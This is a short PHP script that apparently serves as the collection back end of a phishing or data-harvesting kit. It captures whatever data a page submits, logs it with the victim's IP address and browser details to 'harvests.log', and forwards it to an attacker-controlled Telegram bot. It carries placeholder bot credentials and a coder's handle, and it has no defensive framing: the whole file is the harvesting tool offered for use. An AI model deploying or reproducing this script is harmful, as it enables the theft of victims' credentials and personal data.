<?php
date_default_timezone_set('UTC');
$logFile = 'harvests.log';
$data = json_decode(file_get_contents('php://input'), true) ?: $_POST ?: $_GET;
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$entry = "[$timestamp] IP: $ip | UA: $userAgent | Data: " . json_encode($data) . PHP_EOL;
file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);

// Telegram Forward
$botToken = 'YOUR_BOT_TOKEN';
$chatId = 'YOUR_CHAT_ID';
$message = urlencode("PHP Harvest: " . json_encode($data) . "\nCoder TG: @boyxcodex");
$tgUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message&parse_mode=HTML";
file_get_contents($tgUrl);

http_response_code(200);
echo json_encode(['status' => 'success']);
?>
